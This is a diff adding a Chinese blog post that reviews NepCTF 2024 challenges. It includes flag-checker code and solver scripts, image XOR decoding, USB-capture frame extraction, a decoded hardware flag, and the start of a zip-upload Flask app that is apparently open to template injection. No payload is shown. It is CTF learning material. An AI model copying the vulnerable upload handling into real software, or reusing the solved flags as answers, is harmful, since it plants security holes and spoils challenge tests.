@@ -1,0 +1,607 @@
+<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>nepctf2024复盘 | 0raN9e's Blog</title><meta name=keywords content="Misc,ssti,serialize"><meta name=description content='Misc
+Nemophila
+import base64
+
+print("这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。")
+print("提示：宝箱怪只会提示你口令正确与否，请你试试吧！")
+flag = input(&#39;Turn in your guess: &#39;)
+
+if len(flag) !=48:
+    print("长度不对！")
+    exit(1)
+
+if ord(flag.capitalize()[0]) != 83 or not flag[0].islower():
+    print("Please try again!")
+    exit(1)
+
+if flag[-3:] != "ve}":
+    print("Please try again!")
+    exit(1)    
+
+if flag.count(chr(95)) != 4:
+    print("Please try again!")
+    exit(1)
+
+if base64.b64encode((flag[10:13]+flag[28:31]).encode(&#39;utf-8&#39;)).decode() != &#39;RnJpSGlt&#39;:
+    print("Please try again!")
+    exit(1)
+
+if int(flag[24:26]) > 10 and int(flag[24:26]) < 20 and pow(int(flag[24:26]),2,5) != 0:
+    print("好像有点不对！")
+    exit(1)
+
+number = flag[33] + flag[41] + flag[43:45]
+if int(number) * 9_27 != 1028970 and not number.isnumeric():
+    print("还是不对呢！")
+    exit(1)
+
+if flag[35:41].replace("e", "1") != "1t1rna":
+    print("Please try again!")
+    exit(1)
+
+if flag[31:33].swapcase() != "ME":
+    print("这不是我!")
+    exit(1)
+
+if list(map(len,flag.split("_"))) != [6, 12, 14, 7, 5] and list(map(len,flag.split("&"))) != [17, 9, 20]:
+    print("换个顺序！")
+    exit(1)    
+
+if ord(min(flag[:2].swapcase())) != 69:
+    print("Please try again!")
+    exit(1)    
+
+if flag[2] + flag[4:6] != "cet4"[:3]:
+    print("我不想考四级！")
+    exit(1)
+
+new=""
+for i in flag[7:10] + flag[18] + flag[26]: new += chr(ord(i) + 1)
+if new != "jt|Df":
+    print("Please try again!")
+    exit(1)    
+
+if "SunR" in flag and "eren" in flag:
+    print("好像对了！可以先去试试！")
+    exit(1)
+
+print("恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！")
+exp'><meta name=author content><link rel=canonical href=http://localhost:1313/posts/ctf/nepctf2024/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://localhost:1313/posts/ctf/nepctf2024/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://localhost:1313/posts/ctf/nepctf2024/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="nepctf2024复盘"><meta property="og:description" content='Misc Nemophila import base64 print("这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。") print("提示：宝箱怪只会提示你口令正确与否，请你试试吧！") flag = input(&#39;Turn in your guess: &#39;) if len(flag) !=48: print("长度不对！") exit(1) if ord(flag.capitalize()[0]) != 83 or not flag[0].islower(): print("Please try again!") exit(1) if flag[-3:] != "ve}": print("Please try again!") exit(1) if flag.count(chr(95)) != 4: print("Please try again!") exit(1) if base64.b64encode((flag[10:13]+flag[28:31]).encode(&#39;utf-8&#39;)).decode() != &#39;RnJpSGlt&#39;: print("Please try again!") exit(1) if int(flag[24:26]) > 10 and int(flag[24:26]) < 20 and pow(int(flag[24:26]),2,5) != 0: print("好像有点不对！") exit(1) number = flag[33] + flag[41] + flag[43:45] if int(number) * 9_27 != 1028970 and not number.isnumeric(): print("还是不对呢！") exit(1) if flag[35:41].replace("e", "1") != "1t1rna": print("Please try again!") exit(1) if flag[31:33].swapcase() != "ME": print("这不是我!") exit(1) if list(map(len,flag.split("_"))) != [6, 12, 14, 7, 5] and list(map(len,flag.split("&"))) != [17, 9, 20]: print("换个顺序！") exit(1) if ord(min(flag[:2].swapcase())) != 69: print("Please try again!") exit(1) if flag[2] + flag[4:6] != "cet4"[:3]: print("我不想考四级！") exit(1) new="" for i in flag[7:10] + flag[18] + flag[26]: new += chr(ord(i) + 1) if new != "jt|Df": print("Please try again!") exit(1) if "SunR" in flag and "eren" in flag: print("好像对了！可以先去试试！") exit(1) print("恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！") exp'><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-28T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-28T00:00:00+00:00"><meta property="article:tag" content="Misc"><meta property="article:tag" content="Ssti"><meta property="article:tag" content="Serialize"><meta name=twitter:card content="summary"><meta name=twitter:title content="nepctf2024复盘"><meta name=twitter:description content='Misc
+Nemophila
+import base64
+
+print("这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。")
+print("提示：宝箱怪只会提示你口令正确与否，请你试试吧！")
+flag = input(&#39;Turn in your guess: &#39;)
+
+if len(flag) !=48:
+    print("长度不对！")
+    exit(1)
+
+if ord(flag.capitalize()[0]) != 83 or not flag[0].islower():
+    print("Please try again!")
+    exit(1)
+
+if flag[-3:] != "ve}":
+    print("Please try again!")
+    exit(1)    
+
+if flag.count(chr(95)) != 4:
+    print("Please try again!")
+    exit(1)
+
+if base64.b64encode((flag[10:13]+flag[28:31]).encode(&#39;utf-8&#39;)).decode() != &#39;RnJpSGlt&#39;:
+    print("Please try again!")
+    exit(1)
+
+if int(flag[24:26]) > 10 and int(flag[24:26]) < 20 and pow(int(flag[24:26]),2,5) != 0:
+    print("好像有点不对！")
+    exit(1)
+
+number = flag[33] + flag[41] + flag[43:45]
+if int(number) * 9_27 != 1028970 and not number.isnumeric():
+    print("还是不对呢！")
+    exit(1)
+
+if flag[35:41].replace("e", "1") != "1t1rna":
+    print("Please try again!")
+    exit(1)
+
+if flag[31:33].swapcase() != "ME":
+    print("这不是我!")
+    exit(1)
+
+if list(map(len,flag.split("_"))) != [6, 12, 14, 7, 5] and list(map(len,flag.split("&"))) != [17, 9, 20]:
+    print("换个顺序！")
+    exit(1)    
+
+if ord(min(flag[:2].swapcase())) != 69:
+    print("Please try again!")
+    exit(1)    
+
+if flag[2] + flag[4:6] != "cet4"[:3]:
+    print("我不想考四级！")
+    exit(1)
+
+new=""
+for i in flag[7:10] + flag[18] + flag[26]: new += chr(ord(i) + 1)
+if new != "jt|Df":
+    print("Please try again!")
+    exit(1)    
+
+if "SunR" in flag and "eren" in flag:
+    print("好像对了！可以先去试试！")
+    exit(1)
+
+print("恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！")
+exp'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"文章","item":"http://localhost:1313/posts/ctf/"},{"@type":"ListItem","position":3,"name":"nepctf2024复盘","item":"http://localhost:1313/posts/ctf/nepctf2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"nepctf2024复盘","name":"nepctf2024复盘","description":"Misc Nemophila import base64 print(\u0026#34;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。\u0026#34;) print(\u0026#34;提示：宝箱怪只会提示你口令正确与否，请你试试吧！\u0026#34;) flag = input(\u0026#39;Turn in your guess: \u0026#39;) if len(flag) !=48: print(\u0026#34;长度不对！\u0026#34;) exit(1) if ord(flag.capitalize()[0]) != 83 or not flag[0].islower(): print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag[-3:] != \u0026#34;ve}\u0026#34;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag.count(chr(95)) != 4: print(\u0026#34;Please try again!\u0026#34;) exit(1) if base64.b64encode((flag[10:13]+flag[28:31]).encode(\u0026#39;utf-8\u0026#39;)).decode() != \u0026#39;RnJpSGlt\u0026#39;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if int(flag[24:26]) \u0026gt; 10 and int(flag[24:26]) \u0026lt; 20 and pow(int(flag[24:26]),2,5) != 0: print(\u0026#34;好像有点不对！\u0026#34;) exit(1) number = flag[33] + flag[41] + flag[43:45] if int(number) * 9_27 != 1028970 and not number.isnumeric(): print(\u0026#34;还是不对呢！\u0026#34;) exit(1) if flag[35:41].replace(\u0026#34;e\u0026#34;, \u0026#34;1\u0026#34;) != \u0026#34;1t1rna\u0026#34;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag[31:33].swapcase() != \u0026#34;ME\u0026#34;: print(\u0026#34;这不是我!\u0026#34;) exit(1) if list(map(len,flag.split(\u0026#34;_\u0026#34;))) != [6, 12, 14, 7, 5] and list(map(len,flag.split(\u0026#34;\u0026amp;\u0026#34;))) != [17, 9, 20]: print(\u0026#34;换个顺序！\u0026#34;) exit(1) if ord(min(flag[:2].swapcase())) != 69: print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag[2] + flag[4:6] != \u0026#34;cet4\u0026#34;[:3]: print(\u0026#34;我不想考四级！\u0026#34;) exit(1) new=\u0026#34;\u0026#34; for i in flag[7:10] + flag[18] + flag[26]: new += chr(ord(i) + 1) if new != \u0026#34;jt|Df\u0026#34;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if \u0026#34;SunR\u0026#34; in flag and \u0026#34;eren\u0026#34; in flag: print(\u0026#34;好像对了！可以先去试试！\u0026#34;) exit(1) print(\u0026#34;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！\u0026#34;) exp\n","keywords":["Misc","ssti","serialize"],"articleBody":"Misc Nemophila import base64 print(\"这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。\") print(\"提示：宝箱怪只会提示你口令正确与否，请你试试吧！\") flag = input('Turn in your guess: ') if len(flag) !=48: print(\"长度不对！\") exit(1) if ord(flag.capitalize()[0]) != 83 or not flag[0].islower(): print(\"Please try again!\") exit(1) if flag[-3:] != \"ve}\": print(\"Please try again!\") exit(1) if flag.count(chr(95)) != 4: print(\"Please try again!\") exit(1) if base64.b64encode((flag[10:13]+flag[28:31]).encode('utf-8')).decode() != 'RnJpSGlt': print(\"Please try again!\") exit(1) if int(flag[24:26]) \u003e 10 and int(flag[24:26]) \u003c 20 and pow(int(flag[24:26]),2,5) != 0: print(\"好像有点不对！\") exit(1) number = flag[33] + flag[41] + flag[43:45] if int(number) * 9_27 != 1028970 and not number.isnumeric(): print(\"还是不对呢！\") exit(1) if flag[35:41].replace(\"e\", \"1\") != \"1t1rna\": print(\"Please try again!\") exit(1) if flag[31:33].swapcase() != \"ME\": print(\"这不是我!\") exit(1) if list(map(len,flag.split(\"_\"))) != [6, 12, 14, 7, 5] and list(map(len,flag.split(\"\u0026\"))) != [17, 9, 20]: print(\"换个顺序！\") exit(1) if ord(min(flag[:2].swapcase())) != 69: print(\"Please try again!\") exit(1) if flag[2] + flag[4:6] != \"cet4\"[:3]: print(\"我不想考四级！\") exit(1) new=\"\" for i in flag[7:10] + flag[18] + flag[26]: new += chr(ord(i) + 1) if new != \"jt|Df\": print(\"Please try again!\") exit(1) if \"SunR\" in flag and \"eren\" in flag: print(\"好像对了！可以先去试试！\") exit(1) print(\"恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！\") exp\nimport base64 # 补全 flag = \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\" # 将字符串转换为列表 flag_list = list(flag) flag_list[0] = chr(83).lower() flag_list[-3:] = \"ve}\" # base64解密带入 base64_code = list(base64.b64decode(\"RnJpSGlt\").decode('utf-8')) flag_list[10:13] = base64_code[0:3] flag_list[28:31] = base64_code[3:] # 简单数学计算答案15 flag_list[24] = \"1\" flag_list[25] = \"5\" # 计算带入 number = str(int(1028970/927)) flag_list[33] = number[0] flag_list[41] = number[1] flag_list[43:45] = number[2:] str1 = \"1t1rna\".replace(\"1\", \"e\") flag_list[35:41] = str1 # 转化大小写 flag_list[31:33] = \"me\" # 进行分割 flag_list[6] = \"_\" flag_list[19] = \"_\" flag_list[34] = \"_\" flag_list[42] = \"_\" flag_list[17] = \"\u0026\" flag_list[27] = \"\u0026\" flag_list[1] = chr(69).lower() flag_list[2] = \"cet4\"[0] flag_list[4:6] = \"cet4\"[1:3] flag_list[7] = chr(ord('j') - 1) flag_list[8] = chr(ord('t') - 1) flag_list[9] = chr(ord('|') - 1) flag_list[18] = chr(ord('D') - 1) flag_list[26] = chr(ord('f') - 1) # 前面的是芙莉莲后面的是辛美尔 flag_list[13:17] = \"eren\" flag_list[20:24] = \"SunR\" # 猜测是单词secret flag_list[3] = \"r\" flag = ''.join(flag_list) print(flag) 得到**secret_is{Frieren\u0026C_SunR15e\u0026Himme1_eterna1_10ve}**解压得到图片，010分析之后可能需要异或得到原来的图片(第一次见,涨知识了)\nexp:\nenc = open('miaomiao.png', 'rb').read() key = b'secret_is{Frieren\u0026C_SunR15e\u0026Himme1_eterna1_10ve}' flag = [] for i in range(len(enc)): data = enc[i]^key[i%len(key)] flag.append(data) flag = bytes(flag) open('flag.png', 'wb').write(flag) 没有直接的flag，crc爆破一下得到flag\nNepMagic —— CheckIn 游戏签到，有一层需要盲走得到隐藏的碎片，走完就可以得到flag了\n3DNep 也是第一次见，010打开开头是gitf，搜索一下是3d模型的图片，改一下.gitf，用该网站看一下在线网址\n可以得到图片，遇到的二维码是汉信码也是第一次见，用在线网站扫一下，得到flag\nNepCTF{6e766b59-23d1-395c26d708a4}\nNepCamera 跟着官方wp也是学一遍，也是第一次见usb类型的流量包，根据官p和晨曦师傅的wp研究了一下，先看一下usb里面的流量包里面会发现有ffd8ffe0的内容，利用tshark先把内容提取出来\ntshark -r NepCamera.pcapng -T fields -e usb.iso.data \u003e test 然后就是写脚本提取内容\ndatas = open('../test', 'r').read().strip().split('\\n') hex_data = '' for i in datas: data = i.split(',') hex_data += ''.join([d[24:] for d in data]) print(len(hex_data)) cnt = 0 while True: start = hex_data.find('ffd8ffe0') if start == -1: break end = hex_data[start+8:].find('ffd8ffe0') if end == -1: end = len(hex_data) out_data = hex_data[start:end] hex_data = hex_data[end:] out_data = bytes.fromhex(out_data) open('./img/'+str(cnt)+'.png','wb').write(out_data) cnt += 1 print(cnt) 对图片进行分析一会就可以得到flag了\nHardware 进行binwalk一下得到许多文件\n再进行string 分析通过排除可以得到在string 19047F里面有\n猜一手base64然后就可以搜=有一串长的内容，利用cyber厨子得到flag\nJZSXAQ2UIZ5VSMDVL5DTA5C7JMZTG3S7GFXFGMLHNB2F6MLOL53FQ5ZQOJFXGIJBEFPUYM3UE5ZV6RZQL5DHK4TUNAZXE7I= NepCTF{Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t’s_G0_Furth3r}\nWeb NepDouble 这题其实已经有思路了，就是利用上传文件进行ssti，但是自己代码没有好好看\nfrom flask import Flask, request, render_template, render_template_string from zipfile import ZipFile import os import datetime import hashlib from jinja2 import Environment, FileSystemLoader app = Flask(__name__, template_folder='static') app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024 UPLOAD_FOLDER = '/app/uploads' app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER) template_env = Environment(loader=FileSystemLoader('static'), autoescape=True) def render_template(template_name, **context): template = template_env.get_template(template_name) return template.render(**context) def render_template_string(template_string, **context): template = template_env.from_string(template_string) return template.render(**context) @app.route('/', methods=['GET', 'POST']) def main(): if request.method != \"POST\": return 'Please use POST method to upload files.' try: clear_uploads_folder() files = request.files.get('tp_file', None) if not files: return 'No file uploaded.' file_size = len(files.read()) files.seek(0) file_extension = files.filename.rsplit('.', 1)[-1].lower() if file_extension != 'zip': return 'Invalid file type. Please upload a .zip file.' timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S') md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest() unzip_folder = os.path.join(app.config['UPLOAD_FOLDER'], md5_dir_name) os.makedirs(unzip_folder, exist_ok=True) with ZipFile(files) as zip_file: zip_file.extractall(path=unzip_folder) files_list = [] for root, dirs, files in os.walk(unzip_folder): for file in files: print(file) file_path = os.path.join(root, file) relative_path = os.path.relpath(file_path, app.config['UPLOAD_FOLDER']) link = f'","wordCount":"3324","inLanguage":"zh-cn","datePublished":"2024-08-28T00:00:00Z","dateModified":"2024-08-28T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/ctf/nepctf2024/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/ title=首页><span>首页</span></a></li><li><a href=http://localhost:1313/archives/ title=归档><span>归档</span></a></li><li><a href=http://localhost:1313/tags/ title=标签><span>标签</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=http://localhost:1313/about/ title=关于><span>关于</span></a></li><li><a href=http://localhost:1313/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2024-08-28 00:00:00 +0000 UTC'>August 28, 2024</span>&nbsp;·&nbsp;<span>7 min</span><h1 class=post-title>nepctf2024复盘</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><h1 id=misc>Misc</h1><h2 id=nemophila>Nemophila</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。&#34;</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;提示：宝箱怪只会提示你口令正确与否，请你试试吧！&#34;</span>)
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#39;Turn in your guess: &#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len(flag) <span style=color:#f92672>!=</span><span style=color:#ae81ff>48</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;长度不对！&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ord(flag<span style=color:#f92672>.</span>capitalize()[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>83</span> <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> flag[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>islower():
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Please try again!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> flag[<span style=color:#f92672>-</span><span style=color:#ae81ff>3</span>:] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;ve}&#34;</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Please try again!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)    
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> flag<span style=color:#f92672>.</span>count(chr(<span style=color:#ae81ff>95</span>)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Please try again!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> base64<span style=color:#f92672>.</span>b64encode((flag[<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>13</span>]<span style=color:#f92672>+</span>flag[<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>31</span>])<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))<span style=color:#f92672>.</span>decode() <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;RnJpSGlt&#39;</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Please try again!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> int(flag[<span style=color:#ae81ff>24</span>:<span style=color:#ae81ff>26</span>]) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>10</span> <span style=color:#f92672>and</span> int(flag[<span style=color:#ae81ff>24</span>:<span style=color:#ae81ff>26</span>]) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>20</span> <span style=color:#f92672>and</span> pow(int(flag[<span style=color:#ae81ff>24</span>:<span style=color:#ae81ff>26</span>]),<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>5</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;好像有点不对！&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>number <span style=color:#f92672>=</span> flag[<span style=color:#ae81ff>33</span>] <span style=color:#f92672>+</span> flag[<span style=color:#ae81ff>41</span>] <span style=color:#f92672>+</span> flag[<span style=color:#ae81ff>43</span>:<span style=color:#ae81ff>45</span>]
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> int(number) <span style=color:#f92672>*</span> <span style=color:#ae81ff>9_27</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1028970</span> <span style=color:#f92672>and</span> <span style=color:#f92672>not</span> number<span style=color:#f92672>.</span>isnumeric():
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;还是不对呢！&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> flag[<span style=color:#ae81ff>35</span>:<span style=color:#ae81ff>41</span>]<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;e&#34;</span>, <span style=color:#e6db74>&#34;1&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;1t1rna&#34;</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Please try again!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> flag[<span style=color:#ae81ff>31</span>:<span style=color:#ae81ff>33</span>]<span style=color:#f92672>.</span>swapcase() <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;ME&#34;</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;这不是我!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> list(map(len,flag<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;_&#34;</span>))) <span style=color:#f92672>!=</span> [<span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>5</span>] <span style=color:#f92672>and</span> list(map(len,flag<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;&amp;&#34;</span>))) <span style=color:#f92672>!=</span> [<span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>20</span>]:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;换个顺序！&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)    
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ord(min(flag[:<span style=color:#ae81ff>2</span>]<span style=color:#f92672>.</span>swapcase())) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>69</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Please try again!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)    
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> flag[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>+</span> flag[<span style=color:#ae81ff>4</span>:<span style=color:#ae81ff>6</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;cet4&#34;</span>[:<span style=color:#ae81ff>3</span>]:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;我不想考四级！&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>new<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> flag[<span style=color:#ae81ff>7</span>:<span style=color:#ae81ff>10</span>] <span style=color:#f92672>+</span> flag[<span style=color:#ae81ff>18</span>] <span style=color:#f92672>+</span> flag[<span style=color:#ae81ff>26</span>]: new <span style=color:#f92672>+=</span> chr(ord(i) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> new <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;jt|Df&#34;</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Please try again!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)    
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;SunR&#34;</span> <span style=color:#f92672>in</span> flag <span style=color:#f92672>and</span> <span style=color:#e6db74>&#34;eren&#34;</span> <span style=color:#f92672>in</span> flag:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;好像对了！可以先去试试！&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！&#34;</span>)
